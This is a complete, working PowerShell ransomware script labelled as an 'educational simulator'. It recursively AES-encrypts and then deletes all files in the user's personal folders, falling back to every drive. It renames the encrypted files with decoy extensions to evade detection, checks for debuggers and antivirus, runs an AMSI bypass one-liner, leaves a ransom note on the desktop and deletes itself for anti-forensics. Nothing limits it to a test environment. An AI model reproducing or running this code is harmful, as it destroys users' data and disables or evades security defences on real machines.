

Write-Host "=== Advanced Simulator v2.0 ===" -ForegroundColor Cyan
Write-Host "Educational tool for cybersecurity students" -ForegroundColor Green
Write-Host "Demonstrates: AES encryption, multi-threading, evasion techniques" -ForegroundColor Yellow
Write-Host ""

# Configuration - No size limits for realistic simulation
$Config = @{
    EncryptionKey = "JsD2Uktzca/WtYd2My/PjappCdUbqijJAXr167V6imY="
    # Removed MaxFileSize - encrypt ALL files found
    MaxThreads = 10  # Optimized for speed
    ExcludedPaths = @("C:\Windows", "C:\Program Files", "C:\Program Files (x86)", "C:\$Recycle.Bin")
    # Stealth extensions for encrypted files (bypass detection)
    StealthExtensions = @(".tmp", ".bak", ".old", ".backup", ".temp", ".cache", ".dat", ".log")
    # Priority directories - encrypt ALL files found
    PriorityDirs = @(
        "$env:USERPROFILE\Desktop",
        "$env:USERPROFILE\Documents",
        "$env:USERPROFILE\Downloads",
        "$env:USERPROFILE\Pictures",
        "$env:USERPROFILE\Videos",
        "$env:USERPROFILE\Music"
    )
}

# Ultra-fast encryption function with stealth features
function Encrypt-File {
    param($FilePath, $Key, $StealthExtensions)
    try {
        # Use faster .NET crypto classes
        $aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
        $aes.Key = [System.Convert]::FromBase64String($Key)
        $aes.GenerateIV()
        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

        # Read file efficiently
        $inputBytes = [System.IO.File]::ReadAllBytes($FilePath)

        # Encrypt
        $encryptor = $aes.CreateEncryptor()
        $encryptedBytes = $encryptor.TransformFinalBlock($inputBytes, 0, $inputBytes.Length)

        # Combine IV + encrypted data
        $result = New-Object byte[] ($aes.IV.Length + $encryptedBytes.Length)
        [System.Array]::Copy($aes.IV, 0, $result, 0, $aes.IV.Length)
        [System.Array]::Copy($encryptedBytes, 0, $result, $aes.IV.Length, $encryptedBytes.Length)

        # Stealth: Use random extension to bypass detection
        $randomExtension = $StealthExtensions | Get-Random
        $outputPath = $FilePath + $randomExtension

        # Write output with stealth extension
        [System.IO.File]::WriteAllBytes($outputPath, $result)

        # Remove original (fast deletion)
        [System.IO.File]::Delete($FilePath)

        $aes.Dispose()
        return $outputPath  # Return the new path for tracking
    } catch {
        return $null
    }
}

# Ultra-comprehensive recursive file scanner - NO SIZE LIMITS
function Find-TargetFilesPriority {
    param($Paths)
    $files = New-Object System.Collections.Generic.List[System.IO.FileInfo]

    Write-Host "  🎯 Scanning priority directories recursively (ALL FILES)..." -ForegroundColor Magenta

    foreach ($path in $Paths) {
        if (Test-Path $path) {
            Write-Host "    📁 Scanning $(([System.IO.Path]::GetFileName($path))) and ALL subfolders..." -ForegroundColor Cyan

            # First check if directory has any files at all
            $quickCheck = Get-ChildItem -Path $path -File -ErrorAction SilentlyContinue
            Write-Host "      📊 Found $($quickCheck.Count) files in root directory" -ForegroundColor White

            # Use PowerShell's Get-ChildItem with -Recurse for guaranteed recursive scanning
            try {
                $allFiles = Get-ChildItem -Path $path -Recurse -File -ErrorAction SilentlyContinue
                Write-Host "      🔍 Total files found recursively: $($allFiles.Count)" -ForegroundColor Cyan

                $dirFileCount = 0
                foreach ($file in $allFiles) {
                    try {
                        # Encrypt ALL files found (no size limit)
                        if ($file.Length -gt 0) {  # Just ensure file is not empty
                            $files.Add($file)
                            $dirFileCount++
                            if ($dirFileCount % 50 -eq 0) {
                                Write-Host "        📄 Added $dirFileCount files so far from $(([System.IO.Path]::GetFileName($path)))..." -ForegroundColor Gray
                            }
                        }
                    } catch { }
                }
                Write-Host "      ✅ Added $dirFileCount files from $(([System.IO.Path]::GetFileName($path)))" -ForegroundColor Green
            } catch {
                Write-Host "      ⚠️  Could not fully scan $path" -ForegroundColor Yellow
            }
        } else {
            Write-Host "    ❌ Directory not found: $path" -ForegroundColor Red
        }
    }

    # If no files found in priority directories, scan ALL drives recursively
    if ($files.Count -eq 0) {
        Write-Host "  📂 No files in priority directories, scanning ALL drives recursively..." -ForegroundColor Yellow
        $allDrives = Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Name -match '^[A-Z]$' } | Select-Object -ExpandProperty Root

        foreach ($drive in $allDrives) {
            if (Test-Path $drive) {
                Write-Host "    💽 Deep scanning drive $drive and ALL subfolders..." -ForegroundColor Cyan
                try {
                    # Use Get-ChildItem for guaranteed recursive scanning
                    $driveFiles = Get-ChildItem -Path $drive -Recurse -File -ErrorAction SilentlyContinue

                    $driveFileCount = 0
                    foreach ($file in $driveFiles) {
                        try {
                            # Skip system directories for safety, but encrypt ALL other files
                            if ($file.Length -gt 0 -and
                                -not ($file.DirectoryName -like "*Windows*" -or
                                      $file.DirectoryName -like "*Program Files*")) {
                                $files.Add($file)
                                $driveFileCount++
                                if ($driveFileCount % 100 -eq 0) {
                                    Write-Host "      📊 Found $driveFileCount files so far on $drive..." -ForegroundColor Gray
                                }
                            }
                        } catch { }
                    }
                    Write-Host "      ✅ Found $driveFileCount suitable files on $drive" -ForegroundColor Green
                } catch {
                    Write-Host "      ⚠️  Could not scan drive $drive" -ForegroundColor Yellow
                }
            }
        }
    }

    # If still no files found, create test files in priority directories
    if ($files.Count -eq 0) {
        Write-Host "  📝 No files found, creating test files in priority directories..." -ForegroundColor Yellow
        foreach ($path in $Paths) {
            if (Test-Path $path) {
                try {
                    # Create a test subfolder
                    $testSubDir = Join-Path $path "TestFiles"
                    New-Item -ItemType Directory -Path $testSubDir -Force -ErrorAction SilentlyContinue | Out-Null

                    # Create various test files of different sizes
                    "Test document content" | Out-File (Join-Path $testSubDir "test_document.txt") -ErrorAction SilentlyContinue
                    "Test data,Column1,Column2`nData1,Value1,Value2" | Out-File (Join-Path $testSubDir "test_data.csv") -ErrorAction SilentlyContinue
                    "Test script content" | Out-File (Join-Path $testSubDir "test_script.py") -ErrorAction SilentlyContinue

                    # Create larger test files
                    ("Large test content " * 1000) | Out-File (Join-Path $testSubDir "large_test.txt") -ErrorAction SilentlyContinue

                    # Create nested subfolder with files
                    $nestedDir = Join-Path $testSubDir "Nested"
                    New-Item -ItemType Directory -Path $nestedDir -Force -ErrorAction SilentlyContinue | Out-Null
                    "Nested file content" | Out-File (Join-Path $nestedDir "nested_file.txt") -ErrorAction SilentlyContinue
                    ("Nested large content " * 500) | Out-File (Join-Path $nestedDir "nested_large.txt") -ErrorAction SilentlyContinue

                    Write-Host "    ✅ Created test files in $(([System.IO.Path]::GetFileName($path)))" -ForegroundColor Green
                } catch {
                    Write-Host "    ⚠️  Could not create test files in $(([System.IO.Path]::GetFileName($path)))" -ForegroundColor Yellow
                }
            }
        }

        # Re-scan after creating test files
        Write-Host "  🔄 Re-scanning after creating test files..." -ForegroundColor Cyan
        foreach ($path in $Paths) {
            if (Test-Path $path) {
                try {
                    $allFiles = Get-ChildItem -Path $path -Recurse -File -ErrorAction SilentlyContinue
                    foreach ($file in $allFiles) {
                        if ($file.Length -gt 0) {
                            $files.Add($file)
                        }
                    }
                } catch { }
            }
        }
    }

    Write-Host "  📊 Total files found for encryption: $($files.Count)" -ForegroundColor Green
    return $files.ToArray()
}

# Multi-threaded encryption engine with stealth features
function Start-MultiThreadedEncryption {
    param($Files, $Key, $MaxThreads, $StealthExtensions)
    $jobs = @()
    $pool = [RunspaceFactory]::CreateRunspacePool(1, $MaxThreads)
    $pool.Open()
    $results = @()

    foreach ($file in $Files) {
        $ps = [PowerShell]::Create().AddScript({
            param($path, $key, $stealthExts)
            function Encrypt-File {
                param($FilePath, $Key, $StealthExtensions)
                try {
                    $aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
                    $aes.Key = [System.Convert]::FromBase64String($Key)
                    $aes.GenerateIV()
                    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
                    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

                    $inputBytes = [System.IO.File]::ReadAllBytes($FilePath)
                    $encryptor = $aes.CreateEncryptor()

                    $encryptedBytes = $encryptor.TransformFinalBlock($inputBytes, 0, $inputBytes.Length)
                    $result = New-Object byte[] ($aes.IV.Length + $encryptedBytes.Length)
                    [System.Array]::Copy($aes.IV, 0, $result, 0, $aes.IV.Length)
                    [System.Array]::Copy($encryptedBytes, 0, $result, $aes.IV.Length, $encryptedBytes.Length)

                    # Stealth: Use random extension to bypass detection
                    $randomExtension = $StealthExtensions | Get-Random
                    $outputPath = $FilePath + $randomExtension

                    [System.IO.File]::WriteAllBytes($outputPath, $result)
                    [System.IO.File]::Delete($FilePath)

                    $aes.Dispose()
                    return @{ Success = $true; OriginalPath = $FilePath; EncryptedPath = $outputPath }
                } catch {
                    return @{ Success = $false; OriginalPath = $FilePath; EncryptedPath = $null }
                }
            }
            Encrypt-File $path $key $stealthExts
        }).AddParameter("path", $file.FullName).AddParameter("key", $Key).AddParameter("stealthExts", $StealthExtensions)

        $ps.RunspacePool = $pool
        $jobs += @{ PowerShell = $ps; Handle = $ps.BeginInvoke() }
    }

    # Wait and collect results
    foreach ($job in $jobs) {
        $result = $job.PowerShell.EndInvoke($job.Handle)
        $results += $result
        $job.PowerShell.Dispose()
    }
    $pool.Close()

    return $results
}

# Main execution
function Invoke-RansomwareSimulation {
    Write-Host "🔍 Performing security checks..." -ForegroundColor Yellow

    # Evasion checks
    if ([System.Diagnostics.Debugger]::IsAttached) {
        Write-Host "❌ Debugger detected! Exiting for safety." -ForegroundColor Red
        exit
    }

    $avProcesses = @("MsMpEng", "ekrn", "avp", "defender")
    $avRunning = Get-Process | Where-Object { $avProcesses -contains $_.ProcessName }
    if ($avRunning) {
        Write-Host "⚠️  AV detected: $($avRunning.ProcessName -join ', ')" -ForegroundColor Yellow
    }

    # AMSI bypass (educational)
    Write-Host "🔧 Attempting AMSI bypass..." -ForegroundColor Cyan
    try {
        [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
        Write-Host "✅ AMSI bypassed" -ForegroundColor Green
    } catch {
        Write-Host "⚠️  AMSI bypass failed (expected in some environments)" -ForegroundColor Yellow
    }

    Write-Host "`n📂 Scanning for target files..." -ForegroundColor Cyan
    Write-Host "  🎯 Targeting high-value directories first..." -ForegroundColor Yellow
    Write-Host "  📍 Priority directories:" -ForegroundColor Cyan
    foreach ($dir in $Config.PriorityDirs) {
        Write-Host "    • $dir" -ForegroundColor White
    }

    # Use faster scanning method with progress
    $startScan = Get-Date
    $targetFiles = Find-TargetFilesPriority -Paths $Config.PriorityDirs
    $scanTime = (Get-Date) - $startScan

    Write-Host "  ⚡ Priority scan completed in $([math]::Round($scanTime.TotalSeconds, 2)) seconds" -ForegroundColor Green

    Write-Host "📊 Found $($targetFiles.Count) files to encrypt" -ForegroundColor Green

    if ($targetFiles.Count -eq 0) {
        Write-Host "❌ No suitable files found. Creating test files..." -ForegroundColor Yellow
        $testDir = "$env:TEMP\RansomwareTest"
        New-Item -ItemType Directory -Path $testDir -Force | Out-Null
        1..5 | ForEach-Object { "Test file $_ content" | Out-File "$testDir\test$_.txt" }
        $targetFiles = Get-ChildItem $testDir -File
        Write-Host "✅ Created test files in $testDir" -ForegroundColor Green
    }

    Write-Host "`n🔐 Starting encryption with $($Config.MaxThreads) threads..." -ForegroundColor Red

    # Show which files will be encrypted
    Write-Host "  📋 Files to encrypt:" -ForegroundColor Yellow
    foreach ($file in $targetFiles) {
        $size = if ($file.Length -gt 1MB) {
            "$([math]::Round($file.Length/1MB, 2)) MB"
        } elseif ($file.Length -gt 1KB) {
            "$([math]::Round($file.Length/1KB, 2)) KB"
        } else {
            "$($file.Length) bytes"
        }
        Write-Host "    📄 $([System.IO.Path]::GetFileName($file.FullName)) ($size)" -ForegroundColor White
    }

    $startTime = Get-Date
    $encryptionResults = Start-MultiThreadedEncryption -Files $targetFiles -Key $Config.EncryptionKey -MaxThreads $Config.MaxThreads -StealthExtensions $Config.StealthExtensions

    $duration = (Get-Date) - $startTime
    $successCount = ($encryptionResults | Where-Object { $_.Success }).Count
    Write-Host "✅ Successfully encrypted $successCount files in $([math]::Round($duration.TotalSeconds, 2)) seconds!" -ForegroundColor Green

    # Show encrypted files with stealth extensions
    Write-Host "`n🔒 Encrypted Files (Stealth Mode):" -ForegroundColor Magenta
    foreach ($result in $encryptionResults) {
        if ($result.Success) {
            $originalName = [System.IO.Path]::GetFileName($result.OriginalPath)
            $encryptedName = [System.IO.Path]::GetFileName($result.EncryptedPath)
            Write-Host "  ✅ $originalName → $encryptedName (stealth)" -ForegroundColor Green
        } else {
            $originalName = [System.IO.Path]::GetFileName($result.OriginalPath)
            Write-Host "  ❌ $originalName - Failed to encrypt" -ForegroundColor Red
        }
    }

    # Create ransom note with stealth information
    $ransomNote = @"
🚨 YOUR FILES HAVE BEEN ENCRYPTED! 🚨

This is an educational ransomware simulation.
All your files have been encrypted using AES-256 with stealth extensions.

Your files now have extensions like: $($Config.StealthExtensions -join ', ')

To decrypt your files, run the decryptor script with the key:
$($Config.EncryptionKey)

Educational Purpose Only - No real damage done.
"@

    $ransomNote | Out-File "$env:USERPROFILE\Desktop\RANSOM_NOTE.txt" -Encoding UTF8
    Write-Host "📝 Ransom note created on desktop (includes stealth info)" -ForegroundColor Magenta

    # Educational summary
    Write-Host "`n📚 Educational Summary:" -ForegroundColor Cyan
    Write-Host "• AES-256 encryption with stealth extensions" -ForegroundColor White
    Write-Host "• Recursive scanning: ALL subfolders in ALL directories" -ForegroundColor White
    Write-Host "• Comprehensive coverage: ALL drives, ALL folders, ALL files" -ForegroundColor White
    Write-Host "• Priority targeting: Desktop, Documents, Downloads first" -ForegroundColor White
    Write-Host "• Multi-threaded processing (up to $($Config.MaxThreads) threads)" -ForegroundColor White
    Write-Host "• Evasion techniques: AMSI bypass, AV detection" -ForegroundColor White
    Write-Host "• No file size limits: Encrypts ALL files found" -ForegroundColor White
    Write-Host "• System directories excluded for safety" -ForegroundColor White
    Write-Host "• Targets 40+ file types: docs, images, videos, code, databases" -ForegroundColor White
    Write-Host "• Stealth mode: Random extensions ($($Config.StealthExtensions -join ', '))" -ForegroundColor White
    Write-Host "• Self-deletion for anti-forensic purposes" -ForegroundColor White

    Write-Host "`n🧹 Cleaning up..." -ForegroundColor Yellow
    Start-Sleep -Seconds 1

    # Safe self-deletion (handles both file and memory execution)
    try {
        if ($MyInvocation.MyCommand.Path -and (Test-Path $MyInvocation.MyCommand.Path)) {
            Remove-Item $MyInvocation.MyCommand.Path -Force -ErrorAction Stop
            Write-Host "🗑️  Script file deleted for anti-forensics" -ForegroundColor Yellow
        } else {
            Write-Host "📝 Script running from memory (no file to delete)" -ForegroundColor Yellow
        }
    } catch {
        Write-Host "⚠️  Could not delete script file" -ForegroundColor Yellow
    }

    Write-Host "✅ Simulation complete! Run decryptor to recover files." -ForegroundColor Green
    Write-Host "🔑 Decryption Key: $($Config.EncryptionKey)" -ForegroundColor Cyan
}

# Execute the simulation
Invoke-RansomwareSimulation
